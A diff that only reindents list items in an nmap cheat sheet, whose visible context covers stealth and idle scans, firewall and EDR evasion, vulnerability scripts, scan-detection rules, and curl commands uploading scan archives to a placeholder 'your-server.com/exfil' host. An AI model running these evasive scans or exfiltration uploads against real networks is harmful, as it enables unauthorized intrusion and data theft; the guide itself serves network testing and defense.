@@ -100,7 +100,7 @@ nmap -sI zombie_ip 192.168.1.1
 
    ## 4. ADVANCED SCANNING TECHNIQUE
 
-  - TCP Null scan (evade non-stateful firewalls)
+- TCP Null scan (evade non-stateful firewalls)
 nmap -sN 192.168.1.1
 
 - TCP FIN scan
@@ -120,7 +120,8 @@ nmap --scanflags SYN,URG 192.168.1.1
 
 
    ## 5. SERVICE AND VULNERABILITY DISCOVERY 
-       - Version detection with intensity (0-9, higher is slower but deeper)
+
+- Version detection with intensity (0-9, higher is slower but deeper)
 nmap -sV --version-intensity 9 192.168.1.1
 
 - Service scan with default scripts
@@ -143,7 +144,8 @@ nmap --script dns-recursion,dns-zone-transfer -p 53 192.168.1.0/24
 
 
    ## 6. OUTPUT AND EXFILTRATION 
-         - Save all formats
+
+- Save all formats
 nmap -oA scan_name 192.168.1.0/24
 
 - Grepable output for scripting
@@ -161,7 +163,8 @@ curl -F "file=@scan_results.tar.gz" http://your-server.com/upload
 
 
   ##  7. TIMING AND PERFORMANCE 
-         - Paranoid (0.1s delay, avoid IDS)
+
+- Paranoid (0.1s delay, avoid IDS)
 nmap -T0 -sS 192.168.1.1
 
 - Sneaky (15s delay, still evasive)
@@ -184,7 +187,8 @@ nmap --min-rate 10000 -p- 192.168.1.1
 
 
   ##  8. EXFILTRATION AND POST-PROCESSING 
-       - Step 1: Host discovery (fast)
+
+- Step 1: Host discovery (fast)
 nmap -sn 192.168.1.0/24 -oG live_hosts.grep
 
 - Step 2: Extract IPs to file
@@ -204,7 +208,8 @@ curl -X POST -F "data=@batch_scan.tar.gz" http://your-server.com/exfil
 
 
    ## 9. TARGET-SPECIFIC COMMANDS 
-         - Web server enumeration
+
+- Web server enumeration
 nmap --script http-enum,http-headers,http-title -p 80,443,8080 192.168.1.1
 
 - SMB enumeration (Windows networks)
@@ -224,7 +229,8 @@ nmap --script snmp-community,snmp-info -p 161 192.168.1.0/24
 
 
 ## 10. AGGRESSIVE COMMANDS 
-      - Full aggressive on entire subnet
+
+- Full aggressive on entire subnet
 nmap -A -T4 -p- 192.168.1.0/24 -oA full_subnet_scan
 
 - Vulnerability scan with maximum intensity
@@ -239,7 +245,8 @@ nmap -sV -A -p $(grep -E "^[0-9]" fast_ports.txt | cut -d'/' -f1 | tr '\n' ',') 
 
 
 ## 11. IP V6 SCANNING 
-       - IPv6 ping sweep (find live hosts)
+   
+- IPv6 ping sweep (find live hosts)
 nmap -6 -sn 2001:db8::/32
 
 - IPv6 version scan
@@ -262,7 +269,8 @@ nmap -6 -f -sS 2001:db8::1
 
 
 ## 12. FIREWALL EVASION 
-      - Randomize host order (evade pattern-based detection)
+
+- Randomize host order (evade pattern-based detection)
 nmap --randomize-hosts 192.168.1.0/24
 
 - Append random data to packets (evade signature detection)
@@ -288,7 +296,8 @@ nmap --scan-delay 1s --max-retries 0 192.168.1.1
  
 
 ## 13. NSE SCRIPT DEVELOPMENT 
-       - List all scripts by category
+
+- List all scripts by category
 ls /usr/share/nmap/scripts/*.nse
 
 - Search for scripts by keyword
@@ -326,7 +335,7 @@ end
 
 ## 14. ADVANCED OUTPUT PARSING (+1000 HOSTS)
 
-       - Extract IP:port pairs from grepable output
+- Extract IP:port pairs from grepable output
 grep -E "^Host:" scan.grep | cut -d' ' -f2,4 | tr ' ' ':' > ip_port_pairs.txt
 
 - Generate a list of hosts with specific open ports
@@ -345,7 +354,7 @@ grep "open" scan.txt | awk '{print $3}' | sort | uniq -c | sort -rn > service_co
 
 ## 15. SCAN AUTOMATION (more than 1 network scanning)
 
-      - Scan multiple subnets from a list
+- Scan multiple subnets from a list
 while read subnet; do
     nmap -sn $subnet -oG "scan_$(echo $subnet | tr '/' '_').grep"
 done < subnets.txt
@@ -365,7 +374,7 @@ nmap -p $open_ports -sV -T4 192.168.1.0/24
 
 ## 16. DEFENSE (identifying enemies)
 
-      - Detect SYN scans
+- Detect SYN scans
 tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'
 
 - Detect FIN scans
@@ -395,7 +404,7 @@ iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 -
 
 ## 17. EVADING MODERN EDR
 
-       - Slow down to avoid behavioral detection
+- Slow down to avoid behavioral detection
 nmap -T1 --max-retries 0 --min-rtt-timeout 1000 192.168.1.1
 
 - Randomize scan order (evade pattern-based alerts)
